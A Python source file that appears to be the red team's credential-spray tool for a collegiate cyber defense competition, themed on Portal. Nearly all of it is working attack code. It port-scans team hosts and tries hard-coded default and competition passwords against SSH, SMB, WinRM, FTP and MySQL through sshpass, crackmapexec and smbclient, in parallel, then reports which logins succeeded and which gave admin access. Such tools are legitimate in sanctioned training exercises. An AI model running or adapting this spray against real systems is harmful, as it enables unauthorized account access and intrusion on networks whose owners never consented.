#!/usr/bin/env python3
"""
Aperture Science Credential Spray Tool
BYU CCDC Invitational 2026

"Welcome, gentlemen, to Aperture Science. Astronauts, war heroes, 
Olympians—you're here because we want the best."

This tool performs equitable default credential attacks across all
competition teams simultaneously.
"""

import argparse
import concurrent.futures
import json
import logging
import os
import socket
import subprocess
import sys
import time
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Tuple
import threading
import shutil

ROOT_DIR = Path(__file__).resolve().parents[1]
if str(ROOT_DIR) not in sys.path:
    sys.path.insert(0, str(ROOT_DIR))

from lib.common import find_missing_binaries, get_log_dir, resolve_team_numbers


# Configuration


@dataclass
class Credentials:
    username: str
    password: str
    domain: str = ""

@dataclass
class Target:
    hostname: str
    host_id: int
    os_type: str
    services: List[str] = field(default_factory=list)
    
    def get_wan_ip(self, team_num: int) -> str:
        return f"192.168.{200 + team_num}.{self.host_id}"

# In-scope targets with services
TARGETS = [
    Target("curiosity", 140, "windows", ["smb", "winrm", "rdp"]),
    Target("morality", 10, "windows", ["smb", "winrm", "rdp", "http"]),
    Target("anger", 70, "windows", ["smb", "winrm", "rdp", "dns"]),
    Target("space", 141, "windows", ["smb", "winrm", "rdp"]),
    Target("scalable", 73, "linux", ["ssh", "http"]),
    Target("safety", 12, "linux", ["ssh", "http", "ftp"]),
    Target("storage", 14, "linux", ["ssh", "http", "mysql"]),
    Target("cake", 143, "linux", ["ssh", "http"]),
]

# Default credentials to try
DEFAULT_CREDS = [
    Credentials("chell", "Th3cake1salie!"),
    Credentials("chell", "Th3cake1salie!", "presta.local"),
    Credentials("administrator", "Th3cake1salie!"),
    Credentials("admin", "Th3cake1salie!"),
    Credentials("root", "Th3cake1salie!"),
    # Common defaults
    Credentials("admin", "admin"),
    Credentials("administrator", "administrator"),
    Credentials("root", "root"),
    Credentials("root", "toor"),
]


# Logging


LOG_DIR = get_log_dir("aperture")

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - SPRAY - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_DIR / f"spray_{datetime.now():%Y%m%d_%H%M%S}.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("CredSpray")


# Port Scanning


def check_port(ip: str, port: int, timeout: float = 2.0) -> bool:
    """Quick TCP port check"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0
    except:
        return False

def scan_services(ip: str) -> Dict[str, bool]:
    """Scan for common services"""
    ports = {
        "ssh": 22,
        "ftp": 21,
        "http": 80,
        "https": 443,
        "smb": 445,
        "winrm": 5985,
        "rdp": 3389,
        "mysql": 3306,
        "dns": 53,
        "mssql": 1433,
    }
    
    results = {}
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        future_to_service = {
            executor.submit(check_port, ip, port): service 
            for service, port in ports.items()
        }
        for future in concurrent.futures.as_completed(future_to_service):
            service = future_to_service[future]
            try:
                results[service] = future.result()
            except:
                results[service] = False
    
    return results


# SSH Attacks


class SSHSpray:
    """SSH credential spray using sshpass"""
    
    @staticmethod
    def spray(ip: str, creds: Credentials, timeout: int = 10) -> Tuple[bool, str]:
        """Attempt SSH login"""
        if not check_port(ip, 22):
            return False, "Port 22 closed"
        if shutil.which("sshpass") is None:
            return False, "sshpass not installed"
        
        cmd = [
            "sshpass", "-p", creds.password,
            "ssh",
            "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=/dev/null",
            "-o", f"ConnectTimeout={timeout}",
            "-o", "BatchMode=no",
            "-o", "PreferredAuthentications=password",
            "-o", "PubkeyAuthentication=no",
            "-o", "KbdInteractiveAuthentication=no",
            "-o", "NumberOfPasswordPrompts=1",
            f"{creds.username}@{ip}",
            "echo APERTURE_SUCCESS"
        ]
        
        try:
            result = subprocess.run(
                cmd, 
                capture_output=True, 
                text=True, 
                timeout=timeout + 5
            )
            if "APERTURE_SUCCESS" in result.stdout:
                return True, f"SSH success: {creds.username}:{creds.password}"
            return False, "Auth failed"
        except subprocess.TimeoutExpired:
            return False, "Timeout"
        except Exception as e:
            return False, str(e)


# SMB/Windows Attacks


class SMBSpray:
    """SMB credential spray using crackmapexec or smbclient"""
    
    @staticmethod
    def spray_cme(ip: str, creds: Credentials, timeout: int = 15) -> Tuple[bool, str]:
        """Attempt SMB login using CrackMapExec"""
        if not check_port(ip, 445):
            return False, "Port 445 closed"
        
        cmd = [
            "timeout", str(timeout),
            "crackmapexec", "smb", ip,
            "-u", creds.username,
            "-p", creds.password,
        ]
        
        if creds.domain:
            cmd.extend(["-d", creds.domain])
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout + 5)
            output = result.stdout + result.stderr
            
            if "(Pwn3d!)" in output:
                return True, f"SMB Admin: {creds.username}:{creds.password}"
            elif "[+]" in output and "STATUS_LOGON_FAILURE" not in output:
                return True, f"SMB User: {creds.username}:{creds.password}"
            return False, "Auth failed"
        except subprocess.TimeoutExpired:
            return False, "Timeout"
        except Exception as e:
            return False, str(e)
    
    @staticmethod
    def spray_smbclient(ip: str, creds: Credentials, timeout: int = 10) -> Tuple[bool, str]:
        """Fallback using smbclient"""
        if not check_port(ip, 445):
            return False, "Port 445 closed"
        
        cmd = [
            "timeout", str(timeout),
            "smbclient", "-L", ip,
            "-U", f"{creds.username}%{creds.password}",
            "-N" if not creds.password else ""
        ]
        cmd = [c for c in cmd if c]  # Remove empty strings
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout + 5)
            if "Sharename" in result.stdout:
                return True, f"SMB success: {creds.username}:{creds.password}"
            return False, "Auth failed"
        except:
            return False, "Error"


# WinRM Attacks


class WinRMSpray:
    """WinRM credential spray"""
    
    @staticmethod
    def spray(ip: str, creds: Credentials, timeout: int = 15) -> Tuple[bool, str]:
        """Attempt WinRM login using CrackMapExec"""
        if not check_port(ip, 5985):
            return False, "Port 5985 closed"
        
        cmd = [
            "timeout", str(timeout),
            "crackmapexec", "winrm", ip,
            "-u", creds.username,
            "-p", creds.password,
        ]
        
        if creds.domain:
            cmd.extend(["-d", creds.domain])
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout + 5)
            output = result.stdout + result.stderr
            
            if "(Pwn3d!)" in output:
                return True, f"WinRM Admin: {creds.username}:{creds.password}"
            elif "[+]" in output:
                return True, f"WinRM User: {creds.username}:{creds.password}"
            return False, "Auth failed"
        except:
            return False, "Error"


# FTP Attacks


class FTPSpray:
    """FTP credential spray"""
    
    @staticmethod
    def spray(ip: str, creds: Credentials, timeout: int = 10) -> Tuple[bool, str]:
        """Attempt FTP login"""
        if not check_port(ip, 21):
            return False, "Port 21 closed"
        
        import ftplib
        try:
            ftp = ftplib.FTP(timeout=timeout)
            ftp.connect(ip, 21)
            ftp.login(creds.username, creds.password)
            ftp.quit()
            return True, f"FTP success: {creds.username}:{creds.password}"
        except ftplib.error_perm:
            return False, "Auth failed"
        except:
            return False, "Error"


# MySQL Attacks


class MySQLSpray:
    """MySQL credential spray"""
    
    @staticmethod
    def spray(ip: str, creds: Credentials, timeout: int = 10) -> Tuple[bool, str]:
        """Attempt MySQL login"""
        if not check_port(ip, 3306):
            return False, "Port 3306 closed"
        
        cmd = [
            "timeout", str(timeout),
            "mysql",
            "-h", ip,
            "-u", creds.username,
            f"-p{creds.password}",
            "-e", "SELECT 'APERTURE_SUCCESS'",
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout + 5)
            if "APERTURE_SUCCESS" in result.stdout:
                return True, f"MySQL success: {creds.username}:{creds.password}"
            return False, "Auth failed"
        except:
            return False, "Error"


# Main Spray Engine


class SprayEngine:
    """Main credential spray orchestrator"""
    
    def __init__(self, teams: List[int], parallel: bool = True, max_workers: int = 50):
        self.teams = teams
        self.parallel = parallel
        self.max_workers = max_workers
        self.results: Dict[str, List[Dict]] = {
            "ssh": [],
            "smb": [],
            "winrm": [],
            "ftp": [],
            "mysql": [],
        }
        self.lock = threading.Lock()
    
    def spray_target(self, team_num: int, target: Target, creds: Credentials) -> List[Dict]:
        """Spray a single target with credentials"""
        results = []
        wan_ip = target.get_wan_ip(team_num)
        logger.info(
            f"[Team {team_num}] Testing {target.hostname} ({wan_ip}) with {creds.username} ({target.os_type})."
        )
        
        # SSH
        if target.os_type == "linux":
            success, msg = SSHSpray.spray(wan_ip, creds)
            if success:
                result = {
                    "team": team_num,
                    "target": target.hostname,
                    "ip": wan_ip,
                    "service": "ssh",
                    "creds": f"{creds.username}:{creds.password}",
                    "message": msg
                }
                results.append(result)
                with self.lock:
                    self.results["ssh"].append(result)
                logger.info(f"[Team {team_num}] SSH SUCCESS on {target.hostname}: {creds.username}")
        
        # SMB
        if target.os_type == "windows":
            success, msg = SMBSpray.spray_cme(wan_ip, creds)
            if success:
                result = {
                    "team": team_num,
                    "target": target.hostname,
                    "ip": wan_ip,
                    "service": "smb",
                    "creds": f"{creds.username}:{creds.password}",
                    "message": msg
                }
                results.append(result)
                with self.lock:
                    self.results["smb"].append(result)
                logger.info(f"[Team {team_num}] SMB SUCCESS on {target.hostname}: {creds.username}")
        
        # WinRM
        if target.os_type == "windows":
            success, msg = WinRMSpray.spray(wan_ip, creds)
            if success:
                result = {
                    "team": team_num,
                    "target": target.hostname,
                    "ip": wan_ip,
                    "service": "winrm",
                    "creds": f"{creds.username}:{creds.password}",
                    "message": msg
                }
                results.append(result)
                with self.lock:
                    self.results["winrm"].append(result)
                logger.info(f"[Team {team_num}] WinRM SUCCESS on {target.hostname}: {creds.username}")
        
        return results
    
    def run_spray(self, creds_list: List[Credentials] = None) -> Dict:
        """Run the full credential spray"""
        if creds_list is None:
            creds_list = DEFAULT_CREDS
        
        logger.info("=" * 70)
        logger.info("APERTURE SCIENCE CREDENTIAL ENRICHMENT TEST INITIATED")
        logger.info(f"Teams: {self.teams}")
        logger.info(f"Targets: {len(TARGETS)}")
        logger.info(f"Credential sets: {len(creds_list)}")
        logger.info(f"Parallel mode: {self.parallel} (workers={self.max_workers})")
        logger.info("=" * 70)
        
        tasks = []
        for team_num in self.teams:
            logger.info(f"Queued targets for Team {team_num}.")
            for target in TARGETS:
                for creds in creds_list:
                    tasks.append((team_num, target, creds))
        logger.info(f"Prepared {len(tasks)} total spray tasks.")
        
        if self.parallel:
            with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
                futures = [
                    executor.submit(self.spray_target, team_num, target, creds)
                    for team_num, target, creds in tasks
                ]
                
                # Wait for completion with progress
                completed = 0
                for future in concurrent.futures.as_completed(futures):
                    completed += 1
                    if completed % 50 == 0:
                        logger.info(f"Progress: {completed}/{len(tasks)} tasks completed")
        else:
            for i, (team_num, target, creds) in enumerate(tasks):
                self.spray_target(team_num, target, creds)
                if (i + 1) % 50 == 0:
                    logger.info(f"Progress: {i+1}/{len(tasks)} tasks completed")
        
        return self.results
    
    def generate_report(self) -> str:
        """Generate a summary report"""
        report = []
        report.append("\n" + "=" * 70)
        report.append("APERTURE SCIENCE CREDENTIAL SPRAY REPORT")
        report.append("=" * 70)
        report.append(f"Timestamp: {datetime.now().isoformat()}")
        report.append(f"Teams tested: {self.teams}")
        report.append("")
        
        # Summary by service
        for service, hits in self.results.items():
            report.append(f"\n{service.upper()} - {len(hits)} successful authentications")
            if hits:
                # Group by team
                by_team = {}
                for hit in hits:
                    team = hit["team"]
                    if team not in by_team:
                        by_team[team] = []
                    by_team[team].append(hit)
                
                for team in sorted(by_team.keys()):
                    team_hits = by_team[team]
                    report.append(f"  Team {team}:")
                    for hit in team_hits:
                        report.append(f"    - {hit['target']} ({hit['ip']}): {hit['creds']}")
        
        # Overall summary
        total_hits = sum(len(hits) for hits in self.results.values())
        report.append("\n" + "=" * 70)
        report.append(f"TOTAL SUCCESSFUL AUTHENTICATIONS: {total_hits}")
        report.append("=" * 70)
        
        return "\n".join(report)


# CLI


def main():
    parser = argparse.ArgumentParser(
        description="Aperture Science Credential Spray Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  %(prog)s --teams 1-12                    Spray all teams with default creds
  %(prog)s --teams 1,3,5 --sequential      Spray specific teams sequentially
  %(prog)s --teams 1-12 --json report.json Save JSON report
  %(prog)s --scan-only --teams 1           Just scan services
        '''
    )
    
    parser.add_argument("--teams",
                        help="Team range (e.g., '1-12' or '1,3,5'). If omitted, prompt for team count and list.")
    parser.add_argument("--parallel", action="store_true", default=True,
                        help="Run in parallel (default)")
    parser.add_argument("--sequential", action="store_true",
                        help="Run sequentially")
    parser.add_argument("--workers", type=int, default=50,
                        help="Max parallel workers (default: 50)")
    parser.add_argument("--json", type=str,
                        help="Save results to JSON file")
    parser.add_argument("--scan-only", action="store_true",
                        help="Only scan for services, don't spray")
    parser.add_argument("--extra-creds", type=str,
                        help="Additional creds file (user:pass per line)")
    
    args = parser.parse_args()
    
    print("""
    ╔═══════════════════════════════════════════════════════════════════╗
    ║   ███████╗██████╗ ██████╗  █████╗ ██╗   ██╗                       ║
    ║   ██╔════╝██╔══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝                       ║
    ║   ███████╗██████╔╝██████╔╝███████║ ╚████╔╝                        ║
    ║   ╚════██║██╔═══╝ ██╔══██╗██╔══██║  ╚██╔╝                         ║
    ║   ███████║██║     ██║  ██║██║  ██║   ██║                          ║
    ║   ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝                          ║
    ║                                                                   ║
    ║   Aperture Science Credential Spray Tool                          ║
    ║   "Science isn't about WHY. It's about WHY NOT."                  ║
    ╚═══════════════════════════════════════════════════════════════════╝
    """)
    
    # Parse teams
    if not args.teams:
        teams = resolve_team_numbers()
    else:
        teams = resolve_team_numbers(args.teams)

    missing = find_missing_binaries(["sshpass", "crackmapexec", "smbclient", "mysql", "timeout"])
    if missing:
        print(f"[!] Missing local binaries: {', '.join(missing)}")
        print("[!] Install these tools to enable all spray modules.")
    
    # Scan only mode
    if args.scan_only:
        print("\n[*] Scanning services for all targets...")
        for team_num in teams:
            print(f"\n=== Team {team_num} ===")
            for target in TARGETS:
                wan_ip = target.get_wan_ip(team_num)
                logger.info(f"Scanning {target.hostname} ({wan_ip}) for open services.")
                services = scan_services(wan_ip)
                open_services = [s for s, v in services.items() if v]
                print(f"  {target.hostname} ({wan_ip}): {', '.join(open_services) or 'no services detected'}")
        return
    
    # Load extra credentials if provided
    creds_list = list(DEFAULT_CREDS)
    if args.extra_creds:
        with open(args.extra_creds) as f:
            for line in f:
                line = line.strip()
                if ':' in line:
                    user, passwd = line.split(':', 1)
                    creds_list.append(Credentials(user, passwd))
    
    # Run spray
    engine = SprayEngine(
        teams=teams,
        parallel=not args.sequential,
        max_workers=args.workers
    )
    
    results = engine.run_spray(creds_list)
    
    # Print report
    print(engine.generate_report())
    
    # Save JSON if requested
    if args.json:
        with open(args.json, 'w') as f:
            json.dump({
                "timestamp": datetime.now().isoformat(),
                "teams": teams,
                "results": results
            }, f, indent=2)
        print(f"\n[*] Results saved to {args.json}")
    
    print('\n"Thank you for participating in this Aperture Science')
    print(' computer-aided enrichment activity."\n')

if __name__ == "__main__":
    main()
